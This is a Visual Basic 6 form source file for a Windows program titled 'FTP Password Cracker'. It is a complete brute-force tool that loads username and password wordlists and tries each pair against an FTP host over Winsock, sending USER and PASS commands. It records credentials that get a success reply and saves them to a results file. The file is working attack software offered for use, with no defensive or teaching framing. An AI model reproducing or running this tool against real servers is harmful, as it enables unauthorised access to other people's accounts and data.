VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{4EB55ACF-B056-49E2-A0D1-0F5C5A6AED50}#1.0#0"; "ksyAlphaWin.ocx"
Begin VB.Form frmFTPCracker 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "FTP Password Cracker"
   ClientHeight    =   3765
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   7335
   Icon            =   "ftpFORM.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3765
   ScaleWidth      =   7335
   StartUpPosition =   3  'Windows Default
   Begin MSComctlLib.ProgressBar ProgressBar1 
      Height          =   375
      Left            =   1560
      TabIndex        =   13
      Top             =   3360
      Width           =   5655
      _ExtentX        =   9975
      _ExtentY        =   661
      _Version        =   393216
      Appearance      =   1
   End
   Begin VB.Frame Frame2 
      Caption         =   "Usernames"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2535
      Left            =   120
      TabIndex        =   2
      Top             =   720
      Width           =   2295
      Begin VB.CommandButton Command5 
         Caption         =   "Del"
         Height          =   255
         Left            =   1560
         TabIndex        =   6
         Top             =   2160
         Width           =   615
      End
      Begin VB.CommandButton Command4 
         Caption         =   "Clear"
         Height          =   255
         Left            =   840
         TabIndex        =   5
         Top             =   2160
         Width           =   615
      End
      Begin VB.ListBox List1 
         Height          =   1815
         Left            =   120
         TabIndex        =   4
         Top             =   240
         Width           =   2055
      End
      Begin VB.CommandButton Command2 
         Caption         =   "Add"
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   2160
         Width           =   615
      End
   End
   Begin VB.Frame Frame3 
      Caption         =   "Passwords"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2535
      Left            =   2520
      TabIndex        =   7
      Top             =   720
      Width           =   2295
      Begin VB.CommandButton Command3 
         Caption         =   "Add"
         Height          =   255
         Left            =   120
         TabIndex        =   11
         Top             =   2160
         Width           =   615
      End
      Begin VB.ListBox List2 
         Height          =   1815
         Left            =   120
         TabIndex        =   10
         Top             =   240
         Width           =   2055
      End
      Begin VB.CommandButton Command7 
         Caption         =   "Clear"
         Height          =   255
         Left            =   840
         TabIndex        =   9
         Top             =   2160
         Width           =   615
      End
      Begin VB.CommandButton Command6 
         Caption         =   "Del"
         Height          =   255
         Left            =   1560
         TabIndex        =   8
         Top             =   2160
         Width           =   615
      End
   End
   Begin VB.Frame Frame4 
      Caption         =   "FTP Server Settings"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      Left            =   120
      TabIndex        =   14
      Top             =   0
      Width           =   7095
      Begin VB.TextBox Text4 
         Height          =   285
         Left            =   4560
         MaxLength       =   5
         TabIndex        =   25
         Text            =   "1000"
         Top             =   240
         Width           =   615
      End
      Begin VB.CommandButton Command8 
         Caption         =   "&Cancel"
         Height          =   255
         Left            =   6240
         TabIndex        =   20
         Top             =   240
         Width           =   735
      End
      Begin VB.CommandButton Command1 
         Caption         =   "&Start"
         Height          =   255
         Left            =   5400
         TabIndex        =   19
         Top             =   240
         Width           =   735
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   720
         TabIndex        =   16
         Text            =   "127.0.0.1"
         Top             =   240
         Width           =   1695
      End
      Begin VB.TextBox Text2 
         Height          =   285
         Left            =   3000
         MaxLength       =   5
         TabIndex        =   15
         Text            =   "21"
         Top             =   240
         Width           =   615
      End
      Begin VB.Label Label3 
         Caption         =   "Timeout"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   3720
         TabIndex        =   26
         Top             =   240
         Width           =   735
      End
      Begin VB.Label Label2 
         Caption         =   "Port"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   2520
         TabIndex        =   18
         Top             =   240
         Width           =   495
      End
      Begin VB.Label Label1 
         Caption         =   "Host"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   17
         Top             =   240
         Width           =   1095
      End
   End
   Begin MSComctlLib.StatusBar StatusBar1 
      Align           =   2  'Align Bottom
      Height          =   450
      Left            =   0
      TabIndex        =   12
      Top             =   3315
      Width           =   7335
      _ExtentX        =   12938
      _ExtentY        =   794
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   4
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Object.Visible         =   0   'False
         EndProperty
         BeginProperty Panel2 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Picture         =   "ftpFORM.frx":0442
            Text            =   "Ready"
            TextSave        =   "Ready"
         EndProperty
         BeginProperty Panel3 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Object.Visible         =   0   'False
            Picture         =   "ftpFORM.frx":0894
            Text            =   "Waiting"
            TextSave        =   "Waiting"
         EndProperty
         BeginProperty Panel4 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Object.Visible         =   0   'False
            Picture         =   "ftpFORM.frx":0CE6
            Text            =   "Cracking"
            TextSave        =   "Cracking"
         EndProperty
      EndProperty
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin MSComDlg.CommonDialog OpenFile 
      Left            =   6000
      Top             =   1080
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   6600
      Top             =   1080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer1 
      Interval        =   3000
      Left            =   5520
      Top             =   1560
   End
   Begin VB.Frame Frame1 
      Caption         =   "Results"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2535
      Left            =   4920
      TabIndex        =   0
      Top             =   720
      Width           =   2295
      Begin VB.Timer Timer2 
         Interval        =   30000
         Left            =   1560
         Top             =   840
      End
      Begin ksyAlphaWin.ksyAlphaCtrl ksyAlphaCtrl1 
         Left            =   1080
         Top             =   840
         _ExtentX        =   661
         _ExtentY        =   661
         Transparency    =   1
         FadeInterval    =   0
      End
      Begin VB.CommandButton Command11 
         Caption         =   "Del"
         Height          =   255
         Left            =   1560
         TabIndex        =   24
         Top             =   2160
         Width           =   615
      End
      Begin VB.CommandButton Command10 
         Caption         =   "Clear"
         Height          =   255
         Left            =   840
         TabIndex        =   23
         Top             =   2160
         Width           =   615
      End
      Begin VB.CommandButton Command9 
         Caption         =   "Save"
         Height          =   255
         Left            =   120
         TabIndex        =   22
         Top             =   2160
         Width           =   615
      End
      Begin VB.TextBox Text3 
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000006&
         Height          =   285
         Left            =   120
         TabIndex        =   21
         Top             =   1800
         Width           =   2055
      End
      Begin VB.ListBox List3 
         Height          =   1425
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   2055
      End
      Begin MSComDlg.CommonDialog SaveFile 
         Left            =   1560
         Top             =   1080
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
   End
End
Attribute VB_Name = "frmFTPCracker"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public username As String
Public password As String
Public Cancel As Boolean
Public tested As Boolean
Public match As Boolean

Private Sub form_load()
    ksyAlphaCtrl1.FadeInterval = 1
    ksyAlphaCtrl1.FadeAlpha 1
End Sub
 
Private Sub Command1_Click()
    Winsock1.Close
    Winsock1.RemoteHost = Text1.Text
    Winsock1.RemotePort = CDbl(Text2.Text)
    Dim Sleep As Double
    Sleep = CDbl(Text4.Text)
    If Not List1.ListCount = 0 Then
    If Not List2.ListCount = 0 Then ProgressBar1.Max = List1.ListCount
    If Cancel = True Then Cancel = False
    If Command1.Enabled = True Then Command1.Enabled = False
    If Command2.Enabled = True Then Command2.Enabled = False
    If Command3.Enabled = True Then Command3.Enabled = False
    If Command4.Enabled = True Then Command4.Enabled = False
    If Command5.Enabled = True Then Command5.Enabled = False
    If Command6.Enabled = True Then Command6.Enabled = False
    If Command7.Enabled = True Then Command7.Enabled = False
    If Command9.Enabled = True Then Command9.Enabled = False
    If Command10.Enabled = True Then Command10.Enabled = False
    If Command11.Enabled = True Then Command11.Enabled = False
    If StatusBar1.Panels.Item(2).Visible = True Then StatusBar1.Panels.Item(2).Visible = False
    If StatusBar1.Panels.Item(3).Visible = True Then StatusBar1.Panels.Item(3).Visible = False
    If StatusBar1.Panels.Item(4).Visible = False Then StatusBar1.Panels.Item(4).Visible = True
    Dim usercount As Long
    For usercount = 0 To List1.ListCount - 1
    username = List1.List(usercount)
    If username = "" Then username = " "
    If ProgressBar1.value <> ProgressBar1.Max Then ProgressBar1.value = ProgressBar1.value + 1
    Dim passcount As Long
    For passcount = 0 To List2.ListCount - 1
    tested = False
    password = List2.List(passcount)
    If password = "" Then password = " "
    Winsock1.Close
    Winsock1.Connect
    Do While tested = False
        DoEvents
    Loop
    If match = True Then
        passcount = List2.ListCount - 1
    End If
    If Cancel = True Then
        passcount = List2.ListCount - 1
        usercount = List1.ListCount - 1
    End If
    Call wait(Sleep)
    Next passcount
    Next usercount
    End If
    ProgressBar1.value = 0
    If StatusBar1.Panels.Item(2).Visible = True Then StatusBar1.Panels.Item(2).Visible = False
    If StatusBar1.Panels.Item(3).Visible = False Then StatusBar1.Panels.Item(3).Visible = True
    If StatusBar1.Panels.Item(4).Visible = True Then StatusBar1.Panels.Item(4).Visible = False
    If Command1.Enabled = False Then Command1.Enabled = True
    If Command2.Enabled = False Then Command2.Enabled = True
    If Command3.Enabled = False Then Command3.Enabled = True
    If Command4.Enabled = False Then Command4.Enabled = True
    If Command5.Enabled = False Then Command5.Enabled = True
    If Command6.Enabled = False Then Command6.Enabled = True
    If Command7.Enabled = False Then Command7.Enabled = True
    If Command9.Enabled = False Then Command9.Enabled = True
    If Command10.Enabled = False Then Command10.Enabled = True
    If Command11.Enabled = False Then Command11.Enabled = True
End Sub


Private Sub Command10_Click()
    List3.Clear
End Sub

Private Sub Command11_Click()
    Dim count As Integer
    count = 0
    For count = List3.ListCount - 1 To 0 Step -1
        If List3.Selected(count) = True Then List3.RemoveItem count
        Next count
End Sub

Private Sub Command2_Click()
    OpenFile.InitDir = "C:\program files\FTP Password Cracker"
    OpenFile.Flags = cdlOFNFileMustExist
    OpenFile.Filter = "Username files (*.*)"
    OpenFile.ShowOpen
    Dim textfile As String
    If Not OpenFile.FileName = "" Then
    Open OpenFile.FileName For Input As #1
    Do While Not EOF(1)
        Line Input #1, textfile
        List1.AddItem textfile
        Loop
    Close #1
    End If
    If List1.ListCount < 0 Then
        List1.Clear
        MsgBox "Cannot load that many usernames! Use a smaller username file!", vbOKOnly + vbExclamation, "Username filesize error"
    End If
    OpenFile.FileName = ""
End Sub

Private Sub Command3_Click()
    OpenFile.InitDir = "C:\program files\FTP Password Cracker"
    OpenFile.Flags = cdlOFNFileMustExist
    OpenFile.Filter = "Password files (*.*)"
    OpenFile.ShowOpen
    If Not OpenFile.FileName = "" Then
    Dim textfile As String
    Open OpenFile.FileName For Input As #1
    Do While Not EOF(1)
        Line Input #1, textfile
        List2.AddItem textfile
        Loop
    Close #1
    End If
    If List2.ListCount < 0 Then
        List2.Clear
        MsgBox "Cannot load that many passwords! Use a smaller password file!", vbOKOnly + vbExclamation, "Password filesize error"
    End If
    OpenFile.FileName = ""
End Sub

Private Sub Command4_Click()
    List1.Clear
End Sub

Private Sub Command5_Click()
    Dim count As Integer
    count = 0
    For count = List1.ListCount - 1 To 0 Step -1
        If List1.Selected(count) = True Then List1.RemoveItem count
        Next count
End Sub

Private Sub Command6_Click()
    Dim count As Integer
    count = 0
    For count = List2.ListCount - 1 To 0 Step -1
        If List2.Selected(count) = True Then List2.RemoveItem count
    Next count
End Sub

Private Sub Command7_Click()
    List2.Clear
End Sub

Private Sub Command8_Click()
    ProgressBar1.value = 0
    If Cancel = False Then Cancel = True
    If tested = False Then tested = True
    If StatusBar1.Panels.Item(2).Visible = True Then StatusBar1.Panels.Item(2).Visible = False
    If StatusBar1.Panels.Item(3).Visible = False Then StatusBar1.Panels.Item(3).Visible = True
    If StatusBar1.Panels.Item(4).Visible = True Then StatusBar1.Panels.Item(4).Visible = False
    If Command1.Enabled = False Then Command1.Enabled = True
    If Command2.Enabled = False Then Command2.Enabled = True
    If Command3.Enabled = False Then Command3.Enabled = True
    If Command4.Enabled = False Then Command4.Enabled = True
    If Command5.Enabled = False Then Command5.Enabled = True
    If Command6.Enabled = False Then Command6.Enabled = True
    If Command7.Enabled = False Then Command7.Enabled = True
    If Command9.Enabled = False Then Command9.Enabled = True
    If Command10.Enabled = False Then Command10.Enabled = True
    If Command11.Enabled = False Then Command11.Enabled = True
End Sub

Private Sub Command9_Click()
    SaveFile.InitDir = "C:\program files\FTP Password Cracker"
    SaveFile.Filter = "Results file (*.*)"
    SaveFile.ShowSave
    If Not SaveFile.FileName = "" Then
        If Not List3.ListCount = 0 Then
        Dim count As Integer
        Dim textfile As String
        Open SaveFile.FileName For Output As #1
        For count = List3.ListCount - 1 To 0 Step -1
            Write #1, List3.List(count)
        Next count
        Close #1
        End If
    End If
End Sub

Private Sub Form_Terminate()
    Unload Me
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Cancel = True
    End
End Sub
Private Sub Text2_Change()
    If IsNumeric(Text2.Text) Then
        Text2.Text = Text2.Text
    Else
    Text2.Text = "21"
    End If
    Dim value As Double
    value = CDbl(Text2.Text)
    If value > 65535 Then Text2.Text = "21"
    If value < 0 Then Text2.Text = "21"
    
End Sub

Private Sub Text4_Change()
    If IsNumeric(Text4.Text) Then
        Text4.Text = Text4.Text
    Else
    Text4.Text = 1000
    End If
    Dim value As Double
    value = CDbl(Text4.Text)
    If value > 65535 Then Text4.Text = "1000"
    If value < 0 Then Text4.Text = "1000"
End Sub

Private Sub Timer1_Timer()
    If StatusBar1.Panels.Item(3).Visible = True Then ' waiting
        StatusBar1.Panels.Item(3).Visible = False
        If StatusBar1.Panels.Item(2).Visible = False Then StatusBar1.Panels.Item(2).Visible = True
    End If
End Sub

Private Sub timer2_timer()
    ksyAlphaCtrl1.Alpha = 0
End Sub

Private Sub Winsock1_Connect()
    If Winsock1.State = sckConnected Then Winsock1.SendData ("USER " & username & Chr(10))
    If Winsock1.State = sckConnected Then Winsock1.SendData ("PASS " & password & Chr(10))
    Text3.Text = "Trying: " & username & ":" & password
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    Dim data As String
    Call Winsock1.GetData(data, vbString)
    Dim result As Boolean
    result = data Like "*230*"
    If result = True Then
        List3.AddItem username & ":" & password & "(" & Winsock1.RemoteHost & ":" & Winsock1.RemotePort & ")"
        tested = True
        match = True
    End If
    result = False
    result = data Like "*530*"
    If result = True Then
        tested = True
        match = False
    End If
    result = False
    result = data Like "*421*"
    If result = True Then
        List3.AddItem username & ":" & password & "(" & Winsock1.RemoteHost & ":" & Winsock1.RemotePort & ")"
        tested = True
        match = True
    End If
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    Text3.Text = "Winsock Error!"
    Call Command8_Click
End Sub
